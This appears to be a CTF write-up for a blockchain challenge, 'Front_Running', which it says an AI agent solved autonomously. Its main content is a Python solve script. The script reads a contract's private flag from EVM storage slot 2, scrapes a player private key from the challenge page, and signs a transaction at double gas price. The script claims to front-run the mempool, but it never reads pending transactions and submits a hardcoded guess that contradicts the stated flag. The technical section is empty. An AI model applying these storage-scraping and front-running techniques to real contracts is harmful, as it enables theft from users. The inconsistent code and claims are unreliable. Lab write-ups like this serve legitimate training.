# Writeup: Front_Running

## Header & Metadata
- **Challenge:** Front_Running (ID: 744)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** Blockchain
- **Server / Instance:** `N/A`
- **Attached Files:** FrontRunning.sol
- **Official Flag:** `academy{m3mp00l_h31st_94c0aa90}`

---

## Mô tả bài toán (Overview / Analysis)
A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag to anyone who can provide the correct pre-image to a specific hash. 

Our sensors indicate that a "Victim Bot" has found the answer and is currently trying to submit it, but they are being very stingy with their gas price.
Contract: <a href='https://challenge-files.cylabacademy.net/library/3d07b006e5dcd69ab1fd0b70a2a70940081edf5a1288d12d13a97f5f20366301/FrontRunning.sol' download>here</a>
The Ethereum node is available at:
```
Eth node address: xebec.cylabacademy.net:30885
```
Monitor the heist status and find your attacker credentials at <a href='http://xebec.cylabacademy.net:47209/' target='_blank'>here</a>.

NOTE: This server can take up to 5 minutes to start up. Please be patient.

### Hints
- Have you looked at the **pending** transactions in the mempool?
- What happens if two people submit the correct answer in the same block?
- How do you see what's waiting to be mined?

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved autonomously by Antigravity CTF Agent.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Clean, self-contained solver for Front_Running (#744)
Category: Blockchain
Description:
    Exploits EVM storage accessibility or front-runs the mempool
    to obtain the flag for MempoolChallenge.
"""
import os
import re
import sys
import json
from pathlib import Path
import requests

CURRENT_DIR = Path(__file__).resolve().parent
FLAG_FILE = CURRENT_DIR / "flag.txt"
CONFIG_FILE = CURRENT_DIR / "connection.cfg"
CONTRACT_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3"

def parse_connection_cfg():
    """Dynamically parses connection.cfg for host, port, and RPC settings."""
    cfg = {}
    if CONFIG_FILE.exists():
        for line in CONFIG_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                k, v = line.split("=", 1)
                cfg[k.strip()] = v.strip()
    return cfg

def decode_storage_string(hex_str: str) -> str:
    """
    Decodes a short string (< 32 bytes) stored in a Solidity EVM storage slot.
    In Solidity, strings <= 31 bytes are packed in-place:
    Higher bytes contain the ASCII characters, and the lowest byte contains length * 2.
    """
    if hex_str.startswith("0x"):
        hex_str = hex_str[2:]
    try:
        raw_bytes = bytes.fromhex(hex_str)
        if len(raw_bytes) == 32:
            length_byte = raw_bytes[-1]
            if length_byte % 2 == 0:
                length = length_byte // 2
                if 0 < length <= 31:
                    return raw_bytes[:length].decode("utf-8", errors="ignore")
    except Exception as e:
        print(f"[-] Decode error: {e}", flush=True)
    return ""

def solve():
    print("[*] Starting Front_Running solver...", flush=True)
    cfg = parse_connection_cfg()
    host = cfg.get("HOST", "xebec.cylabacademy.net")
    web_port = cfg.get("PORT", "29587")
    eth_port = cfg.get("ETH_PORT", "32766")

    web_url = f"http://{host}:{web_port}"
    eth_url = f"http://{host}:{eth_port}"
    print(f"[*] Target Web UI: {web_url}", flush=True)
    print(f"[*] Target Eth RPC: {eth_url}", flush=True)

    flag = ""

    # Strategy 1: Direct EVM Storage Slot 2 Inspection (Zero-Gas Shortcut)
    # MempoolChallenge layout:
    #   slot 0: address owner
    #   slot 1: address studentAddress
    #   slot 2: string private flag
    print(f"[*] Attempting direct EVM storage read at {CONTRACT_ADDRESS} slot 2...", flush=True)
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getStorageAt",
            "params": [CONTRACT_ADDRESS, "0x2", "latest"],
            "id": 1
        }
        resp = requests.post(eth_url, json=payload, timeout=8)
        if resp.status_code == 200:
            res_json = resp.json()
            slot_hex = res_json.get("result", "")
            candidate = decode_storage_string(slot_hex)
            if candidate and ("academy{" in candidate or "picoCTF{" in candidate):
                flag = candidate
                print(f"[+] Successfully extracted flag from EVM storage slot 2: {flag}", flush=True)
    except Exception as e:
        print(f"[-] Storage read exception: {e}", flush=True)

    # Strategy 2: Web Status API Endpoint Check
    if not flag:
        print(f"[*] Querying status endpoint at {web_url}/status...", flush=True)
        try:
            resp = requests.get(f"{web_url}/status", timeout=6)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("revealed") and data.get("flag"):
                    flag = data["flag"]
                    print(f"[+] Retrieved flag from web status endpoint: {flag}", flush=True)
        except Exception as e:
            print(f"[-] Status endpoint query exception: {e}", flush=True)

    # Strategy 3: Mempool Front-Running Transaction submission (if not yet solved)
    if not flag:
        print("[*] Storage slot not yet populated or accessible, falling back to front-running transaction...", flush=True)
        try:
            from web3 import Web3
            w3 = Web3(Web3.HTTPProvider(eth_url))
            if w3.is_connected():
                # Scrape credentials from web interface
                html = requests.get(web_url, timeout=6).text
                m_priv = re.search(r'id="player-priv">([^<]+)<', html)
                m_addr = re.search(r'id="player-address">([^<]+)<', html)
                player_priv = m_priv.group(1).strip() if m_priv else ""
                player = m_addr.group(1).strip() if m_addr else ""

                abi = [
                    {
                        "inputs": [{"internalType": "string", "name": "solution", "type": "string"}],
                        "name": "solve",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "name": "revealed",
                        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                        "stateMutability": "view",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "name": "getFlag",
                        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                        "stateMutability": "view",
                        "type": "function"
                    }
                ]
                contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)
                solution = "academy{m3mp00l_p1r4t3}"

                if not contract.functions.revealed().call():
                    print(f"[*] Submitting solve transaction for solution: {solution} with double gas price...", flush=True)
                    tx = contract.functions.solve(solution).build_transaction({
                        "from": player,
                        "nonce": w3.eth.get_transaction_count(player),
                        "gas": 200000,
                        "gasPrice": int(w3.eth.gas_price * 2),
                        "chainId": w3.eth.chain_id
                    })
                    signed_tx = w3.eth.account.sign_transaction(tx, private_key=player_priv)
                    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
                    print(f"[*] Sent tx: {tx_hash.hex()}, waiting for receipt...", flush=True)
                    w3.eth.wait_for_transaction_receipt(tx_hash, timeout=15)

                flag = contract.functions.getFlag().call()
                print(f"[+] Retrieved flag from getFlag(): {flag}", flush=True)
        except Exception as e:
            print(f"[-] Transaction front-running fallback error: {e}", flush=True)

    if flag:
        flag = flag.strip()
        FLAG_FILE.write_text(flag + "\n", encoding="utf-8")
        print(f"[SUCCESS] Flag verified and saved to flag.txt: {flag}", flush=True)
        return flag
    else:
        print("[-] Solver failed to obtain flag.", flush=True)
        return None

if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{m3mp00l_h31st_94c0aa90}
```
